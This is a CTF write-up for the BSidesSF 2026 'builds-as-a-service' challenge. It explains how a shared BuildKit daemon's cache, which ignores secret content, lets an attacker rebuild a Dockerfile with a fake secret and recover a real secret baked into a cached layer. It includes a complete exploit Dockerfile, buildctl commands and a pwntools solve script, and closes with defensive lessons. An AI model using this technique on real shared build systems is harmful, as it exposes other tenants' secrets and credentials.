# builds-as-a-service — Misc (BuildKit Cache Poisoning)

**CTF**: BSidesSF 2026
**Category**: Misc (Container Security)
**Points**: 1000
**Flag**: `CTF{why-do-i-dream-about-docker...}`

---

## TL;DR

A shared BuildKit instance first builds a "flag" Dockerfile that copies a secret into a cached layer, then lets us submit our own Dockerfile. By installing `buildctl` inside our build, extracting the randomized build version from BuildKit's cache metadata, and rebuilding the flag Dockerfile with a fake secret, we trigger a **cache hit** on the layer containing the real flag — because BuildKit's cache key for `RUN --mount=type=secret` does NOT include the secret's content.

---

## Challenge Setup

The server runs BuildKit v0.17.1 in rootless mode. On each connection:

1. **`build_flag()`** builds a Dockerfile with:
   ```dockerfile
   FROM alpine:3.23.3
   RUN echo <RANDOM_40_HEX_CHARS> > /tmp/version
   RUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt
   ```
   The secret `flag` is sourced from `/flag.txt` on the host via `--secret id=flag,src=/flag.txt`.

2. We submit our own Dockerfile which is built on the **same BuildKit instance** (same cache, same daemon at `tcp://127.0.0.1:1234`), but **without** the `--secret` flag.

### Key Observations

- The flag Dockerfile **copies** the secret into the filesystem (`cp /run/secrets/flag /flag.txt`), so the secret is **baked into the cached layer**.
- The `BUILD_VERSION` is randomized to prevent trivial cache reuse.
- Our build runs as **root** inside the container and can access `127.0.0.1:1234` (the BuildKit daemon).

---

## Vulnerability: BuildKit Cache Key Does Not Include Secret Content

BuildKit computes the cache key for a `RUN --mount=type=secret,id=flag` instruction based on:
- The parent layer hash
- The command string (including the `--mount` directive)

It does **NOT** include the actual content of the secret. This means: if we rebuild the exact same Dockerfile with a **different** (fake) secret, BuildKit will **reuse the cached layer** that contains the **real** flag.

---

## Exploit Steps

### Step 1: Install `buildctl` Inside Our Build

We use a multi-stage build to copy `buildctl` from the official BuildKit image:

```dockerfile
FROM moby/buildkit:v0.17.1 AS buildkit
FROM alpine:3.23.3
COPY --from=buildkit /usr/bin/buildctl /usr/bin/buildctl
```

### Step 2: Extract the Random BUILD_VERSION

The flag build's `RUN echo <version> > /tmp/version` is cached in BuildKit. We extract the version hash using `buildctl du --verbose`:

```bash
VERSION=$(buildctl --addr tcp://127.0.0.1:1234 du --verbose 2>&1 \
  | grep "echo " | sed 's/.*echo //' | sed 's/ .*//' | head -1)
```

This finds the cached layer description like:
```
Description: mount / from exec /bin/sh -c echo 68c21bc9a6c5f6ab72d0277e9de4f1f9e28a4575 > /tmp/version
```

### Step 3: Rebuild the Flag Dockerfile with a Fake Secret

We reconstruct the exact same Dockerfile and provide a fake secret file:

```bash
echo "fake" > /tmp/fake_flag.txt

printf 'FROM alpine:3.23.3
RUN echo %s > /tmp/version
RUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt
' "$VERSION" > /tmp/Dockerfile.rebuild

buildctl --addr tcp://127.0.0.1:1234 build \
  --frontend dockerfile.v0 \
  --local context=/tmp \
  --local dockerfile=/tmp \
  --opt filename=Dockerfile.rebuild \
  --secret id=flag,src=/tmp/fake_flag.txt \
  --output type=local,dest=/tmp/out
```

**What happens:**
1. `FROM alpine:3.23.3` → **CACHED** (same base image)
2. `RUN echo <version> > /tmp/version` → **CACHED** (same version hash = same parent + same command)
3. `RUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt` → **CACHED** (same parent + same command string; secret content is NOT part of the cache key!)

The cached layer from step 3 contains `/flag.txt` with the **real** flag.

### Step 4: Read the Flag

```bash
cat /tmp/out/flag.txt
```

The `--output type=local,dest=/tmp/out` exports the build result to `/tmp/out/`, which includes the cached `/flag.txt` containing the real flag.

---

## Full Exploit Dockerfile

```dockerfile
FROM moby/buildkit:v0.17.1 AS buildkit
FROM alpine:3.23.3
COPY --from=buildkit /usr/bin/buildctl /usr/bin/buildctl
RUN set -e && \
    VERSION=$(buildctl --addr tcp://127.0.0.1:1234 du --verbose 2>&1 \
      | grep "echo " | sed 's/.*echo //' | sed 's/ .*//' | head -1) && \
    echo "fake" > /tmp/fake_flag.txt && \
    printf 'FROM alpine:3.23.3\nRUN echo %s > /tmp/version\nRUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt\n' "$VERSION" > /tmp/Dockerfile.rebuild && \
    buildctl --addr tcp://127.0.0.1:1234 build \
      --frontend dockerfile.v0 \
      --local context=/tmp \
      --local dockerfile=/tmp \
      --opt filename=Dockerfile.rebuild \
      --secret id=flag,src=/tmp/fake_flag.txt \
      --output type=local,dest=/tmp/out 2>&1 && \
    cat /tmp/out/flag.txt && false
```

The `&& false` at the end forces the RUN to fail, which makes BuildKit display the command output (including the flag) in the error log — since BuildKit's progress UI only shows stdout/stderr for failed steps.

---

## Solve Script

```python
from pwn import *
import subprocess, time, re

io = remote('builds-as-a-service-657418c1.challenges.bsidessf.net', 4445)
time.sleep(2)
data = io.recv(timeout=5).decode()

# Solve PoW
match = re.search(r'hashcash -mb(\d+) "([^"]+)"', data)
result = subprocess.run(
    ['hashcash', f'-mb{match.group(1)}', match.group(2)],
    capture_output=True, text=True, timeout=300
)
io.sendline(result.stdout.strip().encode())
time.sleep(5)
io.recv(timeout=5)

# Send exploit Dockerfile
dockerfile = r"""FROM moby/buildkit:v0.17.1 AS buildkit
FROM alpine:3.23.3
COPY --from=buildkit /usr/bin/buildctl /usr/bin/buildctl
RUN set -e && \
    VERSION=$(buildctl --addr tcp://127.0.0.1:1234 du --verbose 2>&1 \
      | grep "echo " | sed 's/.*echo //' | sed 's/ .*//' | head -1) && \
    echo "fake" > /tmp/fake_flag.txt && \
    printf 'FROM alpine:3.23.3\nRUN echo %s > /tmp/version\nRUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt\n' "$VERSION" > /tmp/Dockerfile.rebuild && \
    buildctl --addr tcp://127.0.0.1:1234 build \
      --frontend dockerfile.v0 \
      --local context=/tmp \
      --local dockerfile=/tmp \
      --opt filename=Dockerfile.rebuild \
      --secret id=flag,src=/tmp/fake_flag.txt \
      --output type=local,dest=/tmp/out 2>&1 && \
    cat /tmp/out/flag.txt && false
"""
io.send(dockerfile.encode())
io.send(b'\x04')

# Wait and extract flag
time.sleep(60)
raw = io.recvall(timeout=120).decode('latin-1')
clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', raw)
flag = re.search(r'CTF\{[^}]+\}', clean)
if flag:
    print(f"FLAG: {flag.group()}")
io.close()
```

---

## Flag

```
CTF{why-do-i-dream-about-docker...}
```

---

## Key Lessons

1. **BuildKit secrets are NOT included in cache keys.** If a `RUN --mount=type=secret` instruction copies the secret to the filesystem, the resulting layer (with the secret baked in) is cached and can be replayed by anyone who can rebuild the same Dockerfile on the same BuildKit instance.

2. **Never copy secrets to the filesystem in Dockerfiles.** Use secrets only in-memory (e.g., `RUN --mount=type=secret,id=flag cat /run/secrets/flag | some_command` without persisting to disk).

3. **Shared BuildKit instances are dangerous.** If multiple users/builds share the same daemon, cached layers from one build can leak into another.

4. **`buildctl du --verbose`** exposes metadata about all cached layers, including the commands that created them — useful for reconstructing Dockerfiles.

5. **The `--output type=local` flag** allows exporting build results to the local filesystem, making it trivial to extract files from cached layers.
